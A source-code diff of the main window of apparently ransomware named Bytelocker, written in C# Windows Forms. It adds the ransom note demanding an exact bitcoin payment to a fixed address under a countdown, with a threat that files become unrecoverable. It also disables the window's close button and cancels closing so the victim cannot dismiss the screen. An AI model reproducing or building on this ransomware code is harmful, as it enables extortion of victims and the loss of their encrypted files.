@@ -1,4 +1,6 @@
-﻿using Bytelocker.Tools;
+﻿using Bytelocker.Settings;
+using Bytelocker.src.Tools;
+using Bytelocker.Tools;
 using System;
 using System.Windows.Forms;
 
@@ -8,13 +10,26 @@ namespace Bytelocker.UI
     {
         private CommandManager cm;
         private TimeManager tm;
+        private RegistryManager rm = new RegistryManager();
 
         public MainWindow()
         {
             InitializeComponent();
+            MaximizeBox = false;
             this.cm = new CommandManager();
             this.tm = new TimeManager();
             this.tm.ReadFromRegistry();
+        }
+
+        // remove x button
+        protected override CreateParams CreateParams
+        {
+            get
+            {
+                CreateParams cp = base.CreateParams;
+                cp.ClassStyle = cp.ClassStyle | 0x200;
+                return cp;
+            }
         }
 
         private void MainWindow_Load(object sender, EventArgs e)
@@ -51,21 +66,8 @@ namespace Bytelocker.UI
                 "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." + "\n\n" +
                 "To obtain the password, you will need to pay $" + Bytelocker.COST_TO_DECRYPT.ToString() + " USD or a similar amount in a different currency." +
                 "\n\n" + "Payment is accepted in bitcoin only which is an open-source cryptocurrency which funds can be transfered through computer or smartphone without" +
-                " interference of a bank or other financial institution" + "\n\n" + "You will need to send the");
-
-            LinkLabel llUSDToBitcoin = new LinkLabel();
-            llUSDToBitcoin.Text = "correct amount";
-            llUSDToBitcoin.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llUSDToBitcoin_Click);
-            llUSDToBitcoin.AutoSize = true;
-            llUSDToBitcoin.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
-            this.rtfInfo.Controls.Add(llUSDToBitcoin);
-            this.rtfInfo.AppendText(llUSDToBitcoin.Text);
-            this.rtfInfo.AppendText(new String(' ', 3));
-            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
-
-
-            this.rtfInfo.AppendText("in Bitcoin to the following address: (click to copy)" + "\n\n");
-
+                " interference of a bank or other financial institution" + "\n\n" + "You will need to send EXACTLY " + B64Manager.Base64ToString(rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "p")) + 
+                " bitcoin to the following address: (click to copy)" + "\n\n");
 
             LinkLabel llBitcoinAddress = new LinkLabel();
             llBitcoinAddress.Text = Bytelocker.BITCOIN_ADDRESS;
@@ -96,8 +98,9 @@ namespace Bytelocker.UI
         }
 
         // override alt-f4
-        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
         {
+            e.Cancel = true;
         }
 
         private void On_llAESInfo_Click(object sender, EventArgs e)
@@ -122,10 +125,12 @@ namespace Bytelocker.UI
 
         private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
         {
+            this.LaunchListOfEncryptedFilesWindow();
         }
 
         private void BtnNext_Click(object sender, EventArgs e)
         {
+            Bytelocker.Uninstall();
         }
 
         private void UpdateTimeLeftEvent(object sender, EventArgs e)
@@ -146,6 +151,12 @@ namespace Bytelocker.UI
             {
                 this.lbTimeLeft.Text = (TimeSpan.FromSeconds(timeLeftSeconds)).ToString(@"dd\:hh\:mm\:ss");
             }
+        }
+
+        private void LaunchListOfEncryptedFilesWindow()
+        {
+            EncryptedFilesList efl = new EncryptedFilesList();
+            efl.ShowDialog();
         }
     }
 }
